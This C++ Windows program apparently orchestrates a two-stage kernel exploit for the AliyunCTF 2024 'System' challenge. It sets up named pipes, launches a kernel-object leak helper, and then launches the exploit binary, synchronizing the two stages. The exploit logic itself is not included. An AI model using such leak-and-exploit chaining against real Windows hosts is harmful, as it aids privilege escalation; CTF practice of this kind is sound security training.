#define _CRT_SECURE_NO_WARNINGS 0
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <Psapi.h>

#define err_exit(msg) \
    do { \
       printf("[x] %s in %s: %d\n", msg, FILENAME(__FILE__), __LINE__); \
	   exit(-1); \
    } while (0)

#define FILENAME(file) (strrchr(file, '\\') ? strrchr(file, '\\') + 1 : file)

#define info(fmt, ...) \
    do { \
            printf(fmt"  [%s: %d]\n", ##__VA_ARGS__, FILENAME(__FILE__), __LINE__); \
    } while (0)

HANDLE hPipe0 = INVALID_HANDLE_VALUE;
HANDLE hPipe1 = INVALID_HANDLE_VALUE;
void init() {
	hPipe0 = CreateNamedPipe(
		L"\\\\.\\pipe\\NamedPipe0",
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
		1,
		4096, 4096,
		NMPWAIT_WAIT_FOREVER, 0);

	if (hPipe0 == INVALID_HANDLE_VALUE) {
		err_exit("Failed to create pwn-leak NamedPipe");
	}

	hPipe1 = CreateNamedPipe(
		L"\\\\.\\pipe\\NamedPipe1",
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
		1,
		4096, 4096,
		NMPWAIT_WAIT_FOREVER, 0);

	if (hPipe1 == INVALID_HANDLE_VALUE) {
		CloseHandle(hPipe0);
		err_exit("Failed to create pwn-exp NamedPipe");
	}
}

void waitForLeakProcess() {
	info("[+] Wait for Leak process");
	DWORD retVal;
	UCHAR x;

	if (!ConnectNamedPipe(hPipe0, NULL) && GetLastError() != ERROR_PIPE_CONNECTED) {
		err_exit("Failed to ConnectNamedPipe0");
	}

	if (!ReadFile(hPipe0, &x, sizeof(x), &retVal, 0) || retVal <= 0) {
		err_exit("Failed to ReadFile");
	}

	if (x == 'X') {
		info("[+] Let's start exp process!");
	}
}

void waitFoExpProcess() {
	info("[+] Wait for Exp process");
	DWORD retVal;
	UCHAR x;

	if (!ConnectNamedPipe(hPipe1, NULL) && GetLastError() != ERROR_PIPE_CONNECTED) {
		err_exit("Failed to ConnectNamedPipe1");
	}

	if (!ReadFile(hPipe1, &x, sizeof(x), &retVal, 0) || retVal <= 0) {
		err_exit("Failed to ReadFile");
	}

	if (x == 'X') {
		info("[+] The exp process end!");
	}
}

void clean() {
	DisconnectNamedPipe(hPipe0);
	CloseHandle(hPipe0);
	DisconnectNamedPipe(hPipe1);
	CloseHandle(hPipe1);
}

int main()
{
#ifdef CHECK
#define PATH "C:\\Users\\zqbzs\\OneDrive\\桌面\\PWN_FOR_FUN\\winPwn\\kernel\\workdir\\exploit\\Release\\"
#else
#define PATH ""
#endif // CHECK
	init();
	WinExec("Leak_Object_by_Handle.exe", SW_SHOWNORMAL);
	waitForLeakProcess();
	WinExec(PATH "AliyunCTF2024-System.exe", SW_SHOWNORMAL);
	waitFoExpProcess();
	clean();
	Sleep(2000);
	info("[+] Pwn Process END!");
	getchar();
//	while (1) {
//		Sleep(1000);
//	}
	return 0;
}